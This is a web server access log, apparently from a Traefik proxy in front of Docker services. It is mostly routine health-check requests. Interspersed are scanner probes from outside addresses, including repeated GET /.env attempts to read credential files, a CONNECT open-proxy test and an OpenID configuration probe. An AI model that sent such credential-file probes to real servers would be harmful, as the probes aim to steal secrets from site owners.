167.71.120.76 - - [20/Dec/2023:21:56:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3122 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:57:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3123 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:57:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3124 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:58:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3125 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:21:58:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3126 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:59:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3127 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:59:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3128 "www@docker" "http://172.20.0.9:80" 0ms
90.151.171.106 - - [20/Dec/2023:21:59:56 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 3129 "web-to-websecure@internal" "-" 0ms
90.151.171.106 - - [20/Dec/2023:22:00:06 +0000] "GET ?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 3130 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:22:00:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3131 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:22:00:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3132 "www@docker" "http://172.20.0.9:80" 1ms
143.110.222.166 - - [20/Dec/2023:22:00:48 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3133 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:22:01:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3134 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:01:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3135 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:02:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3136 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:02:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3137 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:03:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3138 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:03:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3139 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:04:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3140 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:04:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3141 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:05:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3142 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:05:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3143 "www@docker" "http://172.20.0.9:80" 0ms
143.110.222.166 - - [20/Dec/2023:22:06:01 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3144 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:22:06:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3145 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:22:06:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3146 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:07:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3147 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:07:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3148 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:08:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3149 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:08:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3150 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:09:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3151 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:22:09:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3152 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:10:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3153 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:10:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3154 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:22:11:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3155 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:22:11:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3156 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:22:12:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3157 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:12:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3158 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:13:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3159 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:13:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3160 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:22:14:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3161 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:14:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3162 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:22:15:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3163 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:15:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3164 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:16:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3165 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:16:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3166 "www@docker" "http://172.20.0.9:80" 0ms
91.215.85.61 - - [20/Dec/2023:22:17:02 +0000] "GET /oauth/idp/.well-known/openid-configuration HTTP/1.1" 404 19 "-" "-" 3167 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:22:17:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3168 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:17:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3169 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:18:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3170 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:18:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3171 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:22:19:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3172 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:19:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3173 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:20:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3174 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:20:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3175 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:21:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3176 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:21:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3177 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:22:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3178 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:22:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3179 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:23:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3180 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:23:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3181 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:24:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3182 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:24:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3183 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:25:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3184 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:25:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3185 "www@docker" "http://172.20.0.9:80" 0ms
173.48.140.140 - - [20/Dec/2023:22:25:52 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 3186 "logpager@docker" "http://172.20.0.3:80" 37ms
173.48.140.140 - - [20/Dec/2023:22:25:52 +0000] "GET /logs/styles.css?version=16 HTTP/2.0" 304 0 "-" "-" 3187 "logpager@docker" "http://172.20.0.3:80" 1ms
173.48.140.140 - - [20/Dec/2023:22:25:52 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1972 "-" "-" 3188 "logpager@docker" "http://172.20.0.3:80" 5ms
159.203.109.206 - - [20/Dec/2023:22:26:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3189 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:26:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3190 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:27:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3191 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:27:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3192 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:28:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3193 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:28:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3194 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:29:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3195 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:22:29:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3196 "www@docker" "http://172.20.0.9:80" 0ms
57.129.23.166 - - [20/Dec/2023:22:30:08 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3197 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [20/Dec/2023:22:30:08 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3198 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:22:30:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3199 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:30:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3200 "www@docker" "http://172.20.0.9:80" 0ms
69.164.217.74 - - [20/Dec/2023:22:30:45 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3201 "-" "-" 0ms
192.155.90.220 - - [20/Dec/2023:22:31:06 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3202 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:22:31:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3203 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:31:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3204 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:32:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3205 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:22:32:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3206 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:33:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3207 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:33:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3208 "www@docker" "http://172.20.0.9:80" 0ms
35.240.121.17 - - [20/Dec/2023:22:33:51 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3209 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:22:34:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3210 "www@docker" "http://172.20.0.9:80" 0ms
45.79.163.53 - - [20/Dec/2023:22:34:28 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3211 "-" "-" 0ms
167.71.120.76 - - [20/Dec/2023:22:34:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3212 "www@docker" "http://172.20.0.9:80" 1ms
172.104.11.4 - - [20/Dec/2023:22:35:02 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3213 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:22:35:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3214 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:35:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3215 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:22:36:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3216 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:36:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3217 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:22:37:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3218 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:22:37:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3219 "www@docker" "http://172.20.0.9:80" 1ms
54.36.115.221 - - [20/Dec/2023:22:37:48 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3220 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [20/Dec/2023:22:37:48 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3221 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:22:38:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3222 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:38:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3223 "www@docker" "http://172.20.0.9:80" 0ms
45.79.128.205 - - [20/Dec/2023:22:39:05 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3224 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:22:39:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3225 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:39:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3226 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:40:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3227 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:40:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3228 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:41:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3229 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:41:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3230 "www@docker" "http://172.20.0.9:80" 6ms
159.203.109.206 - - [20/Dec/2023:22:42:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3231 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:42:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3232 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:43:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3233 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:43:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3234 "www@docker" "http://172.20.0.9:80" 1ms
45.190.176.42 - - [20/Dec/2023:22:44:05 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3235 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:22:44:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3236 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:44:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3237 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:45:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3238 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:45:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3239 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:46:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3240 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:46:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3241 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:47:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3242 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:47:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3243 "www@docker" "http://172.20.0.9:80" 0ms
71.6.134.233 - - [20/Dec/2023:22:48:08 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3244 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:22:48:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3245 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:48:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3246 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:49:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3247 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:22:49:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3248 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:50:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3249 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:50:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3250 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:51:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3251 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:51:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3252 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:22:52:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3253 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:22:52:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3254 "www@docker" "http://172.20.0.9:80" 0ms
90.151.171.106 - - [20/Dec/2023:22:52:48 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 3255 "web-to-websecure@internal" "-" 0ms
90.151.171.106 - - [20/Dec/2023:22:52:58 +0000] "GET ?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 3256 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:22:53:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3257 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:53:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3258 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:22:54:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3259 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:54:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3260 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:55:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3261 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:55:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3262 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:22:56:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3263 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:56:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3264 "www@docker" "http://172.20.0.9:80" 0ms
143.110.222.166 - - [20/Dec/2023:22:56:33 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3265 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:22:57:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3266 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:57:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3267 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:22:58:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3268 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:58:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3269 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:22:59:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3270 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:22:59:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3271 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:00:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3272 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:00:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3273 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:01:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3274 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:01:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3275 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:02:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3276 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:23:02:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3277 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:23:03:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3278 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:23:03:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3279 "www@docker" "http://172.20.0.9:80" 1ms
57.129.23.166 - - [20/Dec/2023:23:03:58 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3280 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [20/Dec/2023:23:03:58 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3281 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:23:04:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3282 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:04:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3283 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:05:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3284 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:05:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3285 "www@docker" "http://172.20.0.9:80" 1ms
71.6.134.233 - - [20/Dec/2023:23:05:35 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3286 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:23:06:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3287 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:23:06:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3288 "www@docker" "http://172.20.0.9:80" 0ms
15.204.52.61 - - [20/Dec/2023:23:06:34 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3289 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:23:07:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3290 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:07:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3291 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:08:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3292 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:08:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3293 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:09:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3294 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:09:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3295 "www@docker" "http://172.20.0.9:80" 1ms
143.110.222.166 - - [20/Dec/2023:23:10:11 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3296 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:23:10:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3297 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:23:10:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3298 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:11:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3299 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:11:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3300 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:12:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3301 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:12:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3302 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:13:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3303 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:13:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3304 "www@docker" "http://172.20.0.9:80" 0ms
